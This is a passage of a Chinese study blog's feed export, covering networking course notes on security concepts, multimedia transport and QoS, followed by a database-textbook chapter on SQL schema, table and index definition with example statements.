<h2 id="应用进程跨网络的通信"><a href="#应用进程跨网络的通信" class="headerlink" title="应用进程跨网络的通信"></a>应用进程跨网络的通信</h2><p>系统调用</p>
<p>应用程序编程接口</p>
<h2 id="P2P应用"><a href="#P2P应用" class="headerlink" title="P2P应用"></a>P2P应用</h2><p>没有服务器,主机之间通过对等方式进行交互通信</p>
<h1 id="第七章-网络安全"><a href="#第七章-网络安全" class="headerlink" title="第七章 网络安全"></a>第七章 网络安全</h1><h2 id="重要内容-5"><a href="#重要内容-5" class="headerlink" title="重要内容"></a>重要内容</h2><p>计算机网络面临的安全威胁和一些主要问题</p>
<p>对称密匙密码体制和公匙密码体制</p>
<p>数字签名与鉴别</p>
<p>网络安全协议IPsec协议族和运输安全协议SSl/TSL的要点</p>
<p>系统安全:防火墙和入侵检测</p>
<h2 id="网络攻击"><a href="#网络攻击" class="headerlink" title="网络攻击"></a>网络攻击</h2><p>两种:被动攻击和主动攻击</p>
<p><strong>被动攻击</strong> ：从网络上窃听信息,作为第三者不破坏网络原本的通信</p>
<p><strong>主动攻击:</strong></p>
<p>几种常见的方式:</p>
<p><strong>篡改</strong>:篡改,中断或伪造报文</p>
<p><strong>恶意程序:</strong></p>
<p>计算机病毒</p>
<p>计算机蠕虫</p>
<p>木马</p>
<p>逻辑炸弹</p>
<p>后门入侵</p>
<p>流氓软件</p>
<p><strong>拒绝服务</strong>  ：向服务器不断发送消息使得服务器一直处于繁忙状态;</p>
<h2 id="密码体制"><a href="#密码体制" class="headerlink" title="密码体制"></a>密码体制</h2><p><strong>对称密匙密码体制</strong>:加密密匙与解密密匙使用相同的密码体制;</p>
<p><strong>公匙密码体制</strong> ：使用不同的加密密匙与解密密匙;</p>
<h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a><strong>数字签名</strong></h2><p><strong>数字签名的功能:</strong></p>
<p>报文鉴别</p>
<p>报文的完整性</p>
<p>不可否认(确认报文的发送方)</p>
<h2 id="鉴别"><a href="#鉴别" class="headerlink" title="鉴别"></a>鉴别</h2><p>鉴别是验证通信对象是否正确，并且检验所传送的报文的完整性；、</p>
<p>报文鉴别：</p>
<h2 id="密匙分配"><a href="#密匙分配" class="headerlink" title="密匙分配"></a>密匙分配</h2><h2 id="互联网使用的安全协议"><a href="#互联网使用的安全协议" class="headerlink" title="互联网使用的安全协议"></a>互联网使用的安全协议</h2><h2 id="系统安全-防火墙与入侵检测"><a href="#系统安全-防火墙与入侵检测" class="headerlink" title="系统安全:防火墙与入侵检测"></a>系统安全:防火墙与入侵检测</h2><p>防火墙:一种访问控制技术,禁止不必要的同通信;</p>
<p>入侵检测系统:IDS</p>
<h1 id="第八章-互联网上的音视频服务"><a href="#第八章-互联网上的音视频服务" class="headerlink" title="第八章 互联网上的音视频服务"></a>第八章 互联网上的音视频服务</h1><h2 id="重要内容-6"><a href="#重要内容-6" class="headerlink" title="重要内容"></a>重要内容</h2><p>  多媒体信息的特点</p>
<p>  流媒体的概念</p>
<p>  IP电话使用的几种协议</p>
<p>  改经”经最大努力交付“的几种办法</p>
<p>  互联网IP层提供 最大交付 和 分组独立交付</p>
<p>  TCP协议解决IP层不能可靠交付的问题</p>
<p>多媒体信息在互联网上的传输</p>
<p>多媒体数据的传输对时延和抖动有较大的要求——边传输边播放</p>
<p>音视频传输的特点：</p>
<p>  容忍丢失<br><strong>互联网提供的三类音频视频服务——</strong></p>
<p>  流式存储音视频——边下载便播放</p>
<p>  流式实况音视频——边录制边发送（多播）</p>
<p>  交互式音视频——实时交互式通信</p>
<p>流式存储音视频——</p>
<p>媒体播放器的主要功能：管理用户界面，解压缩，消除时延抖动，处理传输带来的差错</p>
<p>具有<strong>元文件</strong>的万维网服务器</p>
<p>元文件是用来描述或指明其他文件的一些重要信息的非常小的文件，</p>
<p>媒体服务器</p>
<p>媒体播放器向媒体服务器（而不是万维网服务器）请求音视频文件，对流媒体的传输采用TCP协议而不是UDP</p>
<p>实时流协议RTSP</p>
<p>流式实况音视频——交互式音视频</p>
<p>IP电话——实况交互式音频  </p>
<p>IP电话网关——公用电话网和IP网络的接口设</p>
<p>作用：    在呼叫阶段进行电话信令转换</p>
<p>​        在通话期间进行话音编码的转换</p>
<p>IP电话所要使用的几种应用的协议——</p>
<p>  实时运输协议RTP：为实时应用提供端到端的运输，但不保证任何运输质量</p>
<p>  实施运输控制协议RTCP：服务质量的监控与反馈，媒体间的同步以及多播组成员间的标志</p>
<p>  H.323：（信令标准）在互联网的端系统之间进行实时声音和视频会议的标</p>
<p>  会话发起协议SIP</p>
<p>改进最大努力交付的几种方法：</p>
<p>  为使多媒体信息能够在互联网上得到更好的运输体条件，改变方法就是改变之前平等对待所有运输分组</p>
<p>的协议，使得多媒体数据分组在互联网上运输时能够得到相应的优先级（获得更好的服务质量）</p>
<p>服务质量：服务性能的总效果，此效果决定用户对服务的满意程度（可用性，差错率，响应时间，吞吐量，分组丢失率，连接建立时间等性能指标）</p>
<p>几种方法——使互联网提供服务质量：</p>
<p>  即分组的分类，标记，管制，调度，呼叫接纳</p>
<p>1）调度机制</p>
<p>  调度即排队的规则，按优先级排队；借助分类程序对于分组按照权重分类，形成不同权重的队列进行传输</p>
<p>2）管制机制</p>
<p>  1，控制数据流的平均速率<br>  2，限制峰值速率<br>  3，限制突发分组数<br>​                     ————漏桶管制器<br>3）漏桶机制与加权公平排队相结合</p>
<p>综合服务IntServ和资源预留协议RSVP——最初试图将互联网提供的服务划分为不同的类别<br>IntServ可对单个的应用会话提供服务质量的保证——<br>  资源预留</p>
<p>  呼叫接纳</p>
<p>IntServ定义两类服务：</p>
<p>  有保证的服务</p>
<p>  受控负载的服务</p>
<p>IntServ的四个组成部分</p>
<p>  资源预留协议</p>
<p>  接纳控</p>
<p>  分类</p>
<p>  调度器</p>
<h1 id="第九章-无线网络和移动网络"><a href="#第九章-无线网络和移动网络" class="headerlink" title="第九章 无线网络和移动网络"></a>第九章 无线网络和移动网络</h1><p><img src="https://img.npfs06.top/20210315125300.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
  </entry>
  <entry>
    <title>《数据库系统概论》第三章 关系数据库标注语言SQL</title>
    <url>/2021/03/29/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E7%AC%AC%E4%B8%89%E7%AB%A0-%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A0%87%E6%B3%A8%E8%AF%AD%E8%A8%80SQL/</url>
    <content><![CDATA[<p>《数据库系统概论》第三章 关系数据库标注语言SQL<a id="more"></a></p>
<h1 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h1><p><img src="https://img.npfs06.top/20210329234324.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h1 id="SQL概述"><a href="#SQL概述" class="headerlink" title="SQL概述"></a>SQL概述</h1><h2 id="什么是SQL"><a href="#什么是SQL" class="headerlink" title="什么是SQL?"></a>什么是SQL?</h2><ul>
<li>SQL（Structured Query Language）结构化查询语言，是关系数据库的标准语言</li>
<li>SQL是一个通用的、功能极强的关系数据库语言</li>
</ul>
<h2 id="SQL的特点"><a href="#SQL的特点" class="headerlink" title="SQL的特点"></a>SQL的特点</h2><p><strong>① 综合统一</strong></p>
<ul>
<li>集数据定义语言 DDL(Data Definition Language)，数据操纵语言 DML（Data Manipulation Language），数据控制语言 DCL(Data Control Language) 功能于一体。</li>
<li>可以独立完成数据库生命周期中的全部活动：<ul>
<li>定义关系模式，插入数据，建立数据库；</li>
<li>对数据库中的数据进行查询和更新；</li>
<li>数据库重构和维护</li>
<li>数据库安全性、完整性控制等</li>
</ul>
</li>
<li>用户数据库投入运行后，可根据需要随时逐步修改模式，不影响数据的运行。</li>
<li>数据操作符统一</li>
</ul>
<p><strong>② 高度非过程化</strong></p>
<ul>
<li>非关系数据模型的数据操纵语言“面向过程”，必须制定存取路径</li>
<li>SQL只要提出“做什么”，无须了解存取路径。</li>
<li>存取路径的选择以及SQL的操作过程由系统自动完成。</li>
</ul>
<p><strong>③ 面向集合的操作方式</strong></p>
<ul>
<li>非关系数据模型采用面向记录的操作方式，操作对象是一条记录</li>
<li>SQL采用集合操作方式：<ul>
<li>操作对象、查找结果可以是元组的集合</li>
<li>一次插入、删除、更新操作的对象可以是元组的集合</li>
</ul>
</li>
</ul>
<p><strong>④ 以同一种语法结构提供多种使用方式</strong></p>
<ul>
<li>SQL是独立的语言<ul>
<li>能够独立地用于联机交互的使用方式</li>
</ul>
</li>
<li>SQL又是嵌入式语言<ul>
<li>SQL能够嵌入到高级语言（例如C，C++，Java）程序中，供程序员设计程序时使用</li>
</ul>
</li>
</ul>
<p><strong>⑤ 语言简洁，易学易用</strong></p>
<ul>
<li>SQL功能极强，完成核心功能只用了9个动词。</li>
</ul>
<table>
<thead>
<tr>
<th>SQL功能</th>
<th>动词</th>
</tr>
</thead>
<tbody><tr>
<td>数据查询</td>
<td>SELECT</td>
</tr>
<tr>
<td>数据定义</td>
<td>CREATE、DROP、ALTER</td>
</tr>
<tr>
<td>数据操纵</td>
<td>INSERT、UPDATE、DELETE</td>
</tr>
<tr>
<td>数据控制</td>
<td>GRANT、REVOKE</td>
</tr>
</tbody></table>
<h2 id="SQL的基本概念"><a href="#SQL的基本概念" class="headerlink" title="SQL的基本概念"></a>SQL的基本概念</h2><ul>
<li>SQL支持关系数据库三级模式结构</li>
</ul>
<p><img src="https://img.npfs06.top/20210329234343.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><strong>基本表</strong></p>
<ul>
<li>本身独立存在的表</li>
<li>SQL中一个关系就对应一个基本表</li>
<li>一个(或多个)基本表对应一个存储文件</li>
<li>一个表可以带若干索引</li>
</ul>
<p><strong>存储文件</strong></p>
<ul>
<li>逻辑结构组成了关系数据库的内模式</li>
<li>物理结构是任意的，对用户透明</li>
</ul>
<p><strong>视图</strong></p>
<ul>
<li>从一个或几个基本表导出的表</li>
<li>数据库中只存放视图的定义而不存放视图对应的数据</li>
<li>视图是一个虚表</li>
<li>用户可以在视图上再定义视图</li>
</ul>
<h1 id="数据字典"><a href="#数据字典" class="headerlink" title="数据字典"></a>数据字典</h1><ul>
<li><code>数据字典</code>是<code>关系数据库管理系统内部</code>的一组<code>系统表</code>，<code>它记录了数据库中所有的定义信息，包括关系模式定义、视图定义、索引定义、完整性约束定义、各类用户对数据库的操作权限、统计信息等</code>。</li>
<li>关系数据库管理系统在执行SQL的数据定义语句时，实际上就是在更新数据字典表中的相应信息。</li>
<li>在进行查询优化和查询处理时，数据字典中的信息是其重要依据。</li>
</ul>
<h1 id="数据定义"><a href="#数据定义" class="headerlink" title="数据定义"></a>数据定义</h1><h2 id="数据定义概览"><a href="#数据定义概览" class="headerlink" title="数据定义概览"></a>数据定义概览</h2><ul>
<li>SQL的数据定义功能: <code>模式定义</code>、<code>表定义</code>、<code>视图</code>和<code>索引</code>的定义</li>
</ul>
<p><img src="https://img.npfs06.top/20210329234357.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="模式的定义与删除—SCHEMA"><a href="#模式的定义与删除—SCHEMA" class="headerlink" title="模式的定义与删除—SCHEMA"></a>模式的定义与删除—SCHEMA</h2><p><strong>定义模式实际上定义了一个<code>命名空间</code></strong></p>
<ul>
<li>在这个<code>空间</code>中可以<code>定义</code>该<code>模式</code>包含的<code>数据库对象</code>，例如<code>基本表</code>、<code>视图</code>、<code>索引</code>等。</li>
<li>在CREATE SCHEMA中可以接受CREATE TABLE，CREATE VIEW和GRANT子句。</li>
<li><code>CREATE SCHEMA &lt;模式名&gt; AUTHORIZATION &lt;用户名&gt;[&lt;表定义子句&gt;|&lt;视图定义子句&gt;|&lt;授权定义子句&gt;]</code></li>
<li>如果没有指定&lt;模式名&gt;，那么&lt;模式名&gt;隐含为&lt;用户名&gt;</li>
</ul>
<h3 id="定义模式"><a href="#定义模式" class="headerlink" title="定义模式"></a>定义模式</h3><blockquote>
<p>dbo database owner 数据库的创建者,创建该对象的用户. guest 顾客 能够访问数据库中对象的数据, 要求dbo分配权限给guest, 一般给他查看的权限select</p>
</blockquote>
<ul>
<li>这里我先创建一个数据库用户：<br><img src="https://img.npfs06.top/20210329234410.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ul>
<p><strong>[例1]定义一个学生-课程模式S-T</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> SCHEMA &quot;S-T&quot; <span class="keyword">AUTHORIZATION</span> BitHachi;</span><br><span class="line">为用户BitHachi定义了一个模式S<span class="operator">-</span>T</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210329234427.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<ul>
<li>如果没有指定&lt;模式名&gt;，那么&lt;模式名&gt;隐含为&lt;用户名&gt;</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> SCHEMA <span class="keyword">AUTHORIZATION</span> BitHachi；</span><br><span class="line"><span class="operator">&lt;</span>模式名<span class="operator">&gt;</span>隐含为用户名BitHachi</span><br><span class="line">这个不知道咋回事，没出结果，默认模式BitHachi没创建出来，没显示</span><br></pre></td></tr></table></figure>
<p><strong>[例2]为用户BitHachi创建了一个模式S-T，并在其中定义了一个表TAB1。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> SCHEMA &quot;S-T&quot; <span class="keyword">AUTHORIZATION</span> BitHachi</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> TAB1(</span><br><span class="line">COL1 <span class="type">SMALLINT</span>, </span><br><span class="line">COL2 <span class="type">INT</span>,</span><br><span class="line">COL3 <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">COL4 <span class="type">NUMERIC</span>(<span class="number">10</span>,<span class="number">3</span>),</span><br><span class="line">COL5 <span class="type">DECIMAL</span>(<span class="number">5</span>,<span class="number">2</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210329234453.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h3 id="删除模式"><a href="#删除模式" class="headerlink" title="删除模式"></a>删除模式</h3><ul>
<li><code>DROP SCHEMA &lt;模式名&gt; &lt;CASCADE|RESTRICT&gt;</code></li>
<li><code>CASCADE(级联)</code><br>删除模式的同时把该模式中所有的数据库对象全部删除</li>
<li><code>RESTRICT(限制)</code><br>如果该模式中定义了下属的数据库对象（如表、视图等），则拒绝该删除语句的执行。</li>
<li>当该模式中没有任何下属的对象时才能执行。</li>
<li>以下是运行结果，至于为什么是错误的，暂且放在这里，等熟悉相关知识之后，再来解决。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> SCHEMA &quot;S-T&quot; CASCADE;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210329234503.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> SCHEMA &quot;S-T&quot; RESTRICT;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210329234514.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="基本表的定义、删除与修改—TABLE"><a href="#基本表的定义、删除与修改—TABLE" class="headerlink" title="基本表的定义、删除与修改—TABLE"></a>基本表的定义、删除与修改—TABLE</h2><h3 id="定义基本表的标准格式"><a href="#定义基本表的标准格式" class="headerlink" title="定义基本表的标准格式"></a>定义基本表的标准格式</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span>(</span><br><span class="line">      <span class="operator">&lt;</span>列名<span class="operator">&gt;</span> <span class="operator">&lt;</span>数据类型<span class="operator">&gt;</span>[ <span class="operator">&lt;</span>列级完整性约束条件<span class="operator">&gt;</span> ]</span><br><span class="line">      [，<span class="operator">&lt;</span>列名<span class="operator">&gt;</span> <span class="operator">&lt;</span>数据类型<span class="operator">&gt;</span>[ <span class="operator">&lt;</span>列级完整性约束条件<span class="operator">&gt;</span>] ]</span><br><span class="line">       ………</span><br><span class="line">      [，<span class="operator">&lt;</span>表级完整性约束条件<span class="operator">&gt;</span> ]</span><br><span class="line"> );</span><br></pre></td></tr></table></figure>
<ul>
<li><code>如果完整性约束条件涉及到该表的多个属性列，则必须定义在表级上，否则既可以定义在列级也可以定义在表级。</code></li>
<li>示例：<br><img src="https://img.npfs06.top/20210329234527.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="https://img.npfs06.top/20210329234539.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><img src="https://img.npfs06.top/20210329234550.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ul>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ul>
<li>SQL中<code>域</code>的概念用<code>数据类型</code>来实现</li>
<li>定义表的<code>属性</code>时 需要指明其<code>数据类型及长度</code></li>
<li>选用哪种数据类型<ul>
<li>取值范围</li>
<li>要做哪些运算</li>
</ul>
</li>
<li>以下是通用数据类型，不同数据库的数据类型可能有所不同，可查相关文档。</li>
</ul>
<p><img src="https://img.npfs06.top/20210329234603.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h3 id="修改基本表"><a href="#修改基本表" class="headerlink" title="修改基本表"></a>修改基本表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line">[ <span class="keyword">ADD</span> <span class="operator">&lt;</span>新列名<span class="operator">&gt;</span> <span class="operator">&lt;</span>数据类型<span class="operator">&gt;</span> [ 完整性约束 ] ]</span><br><span class="line">[ <span class="keyword">DROP</span> <span class="operator">&lt;</span>完整性约束名<span class="operator">&gt;</span> ]</span><br><span class="line">[ <span class="keyword">ALTER</span> <span class="keyword">COLUMN</span><span class="operator">&lt;</span>列名<span class="operator">&gt;</span> <span class="operator">&lt;</span>数据类型<span class="operator">&gt;</span> ]；</span><br></pre></td></tr></table></figure>
<p><strong>[例8]向Student表增加“入学时间”列，其数据类型为日期型。</strong></p>
<ul>
<li>不论基本表中原来是否已有数据，新增加的列一律为空值。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Student <span class="keyword">ADD</span> S_entrance <span class="type">DATE</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210329234615.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>[例9]将年龄的数据类型由字符型（假设原来的数据类型是字符型）改为整数。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Student <span class="keyword">ALTER</span> <span class="keyword">COLUMN</span> Sage <span class="type">INT</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210329234626.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><strong>[例10]增加课程名称必须取唯一值的约束条件。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Course <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span>(Cname);</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210329234640.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h3 id="删除基本表"><a href="#删除基本表" class="headerlink" title="删除基本表"></a>删除基本表</h3><p><strong>标准格式：</strong><br><code>DROP TABLE &lt;表名&gt;［RESTRICT| CASCADE］；</code></p>
<ul>
<li><p>RESTRICT：删除表是有限制的。</p>
<ul>
<li>欲删除的基本表不能被其他表的约束所引用</li>
<li>如果存在依赖该表的对象，则此表不能被删除</li>
</ul>
</li>
<li><p>CASCADE：删除该表没有限制。</p>
<ul>
<li>在删除基本表的同时，相关的依赖对象一起删除</li>
</ul>
</li>
</ul>
<p><strong>[例11] 删除Student表</strong></p>
<ul>
<li><p>基本表定义被删除，数据被删除</p>
</li>
<li><p>表上建立的索引、视图、触发器等一般也将被删除</p>
</li>
<li><p>还是和上述删除模式情况一样，加了CASCADE和RESTRUCT删除不了</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span>  Student  CASCADE ;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>［例12］若表上建有视图，选择RESTRICT时表不能删除</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">CREATE</span> <span class="keyword">VIEW</span> IS_Student      </span><br><span class="line"><span class="keyword">AS</span> </span><br><span class="line">    <span class="keyword">SELECT</span> Sno,Sname,Sage</span><br><span class="line">    <span class="keyword">FROM</span>  Student</span><br><span class="line">   	    <span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;IS&#x27;</span>;</span><br><span class="line"> <span class="keyword">DROP</span> <span class="keyword">TABLE</span> Student RESTRICT;   </span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210329234830.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">--<span class="meta">ERROR</span>: cannot <span class="meta">drop</span> <span class="meta">table</span> Student because other objects depend <span class="meta">on</span> it</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210329234841.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>[例12]如果选择CASCADE时可以删除表，视图也自动被删除</strong></p>
<ul>
<li>这里还是跟之前的情况一样，删除不了，可能是我用的数据库不同叭</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	<span class="keyword">DROP</span> <span class="keyword">TABLE</span> Student CASCADE; 	    </span><br><span class="line"> <span class="comment">--NOTICE: drop cascades to view IS_Student</span></span><br><span class="line">	<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> IS_Student;</span><br><span class="line"><span class="comment">--ERROR: relation &quot; IS_Student &quot; does not exist </span></span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210329234853.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="索引的建立与删除—INDEX"><a href="#索引的建立与删除—INDEX" class="headerlink" title="索引的建立与删除—INDEX"></a>索引的建立与删除—INDEX</h2><p><strong>建立索引的目的：<code>·加快查询速度·</code></strong></p>
<ul>
<li>谁可以建立索引？<ul>
<li>DBA 或 表的属主（即建立表的人）</li>
<li>DBMS一般会自动建立以下列上的索引</li>
<li>PRIMARY KEY</li>
<li>UNIQUE</li>
</ul>
</li>
<li>谁维护索引？<br>DBMS自动完成</li>
<li>使用索引<br>DBMS自动选择是否使用索引以及使用哪些索引</li>
<li>RDBMS中索引一般采用B+树、HASH索引来实现<ul>
<li>B+树索引具有动态平衡的优点</li>
<li>HASH索引具有查找速度快的特点</li>
</ul>
</li>
<li>采用B+树，还是HASH索引 则由具体的RDBMS来决定</li>
<li>索引是关系数据库的内部实现技术，属于内模式的范畴</li>
<li><code>CREATE INDEX</code>语句定义索引时，可以定义索引是<code>唯一索引、非唯一索引或聚簇索引</code></li>
</ul>
<h3 id="建立索引的标准格式"><a href="#建立索引的标准格式" class="headerlink" title="建立索引的标准格式"></a>建立索引的标准格式</h3><p><strong>语句格式</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> [<span class="keyword">UNIQUE</span>] [CLUSTER] INDEX <span class="operator">&lt;</span>索引名<span class="operator">&gt;</span> </span><br><span class="line"><span class="keyword">ON</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span>(<span class="operator">&lt;</span>列名<span class="operator">&gt;</span>[<span class="operator">&lt;</span>次序<span class="operator">&gt;</span>][,<span class="operator">&lt;</span>列名<span class="operator">&gt;</span>[<span class="operator">&lt;</span>次序<span class="operator">&gt;</span>] ]…)；	</span><br></pre></td></tr></table></figure>
<p><strong>[例13]</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> CLUSTERED	INDEX Stusname</span><br><span class="line">       <span class="keyword">ON</span>   Student(Sname);</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210329234925.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<ul>
<li>在Student表的Sname（姓名）列上建立一个<code>聚簇索引</code></li>
<li>在最经常查询的列上建立聚簇索引以提高查询效率</li>
<li><code>一个基本表上最多只能建立一个聚簇索引</code></li>
<li>经常更新的列不宜建立聚簇索引</li>
</ul>
<p><strong>[例14]为学生-课程数据库中的Student，Course，SC三个表建 立索引。</strong></p>
<ul>
<li>Student表按学号升序建唯一索引</li>
<li>Course表按课程号升序建唯一索引</li>
<li>SC表按学号升序和课程号降序建唯一索引</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">UNIQUE</span> INDEX  Stusno <span class="keyword">ON</span> Student(Sno);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">UNIQUE</span> INDEX  Coucno <span class="keyword">ON</span> Course(Cno);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">UNIQUE</span> INDEX  SCno <span class="keyword">ON</span> SC(Sno <span class="keyword">ASC</span>,Cno <span class="keyword">DESC</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210329234946.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h3 id="删除索引"><a href="#删除索引" class="headerlink" title="删除索引"></a>删除索引</h3><p><strong><code>DROP INDEX &lt;索引名&gt; ON &lt;表名&gt;;</code><br><code>DROP INDEX &lt;表名&gt;.&lt;索引名&gt;;</code></strong></p>
<ul>
<li>删除索引时，系统会从数据字典中删去有关该索引的<br>描述。</li>
</ul>
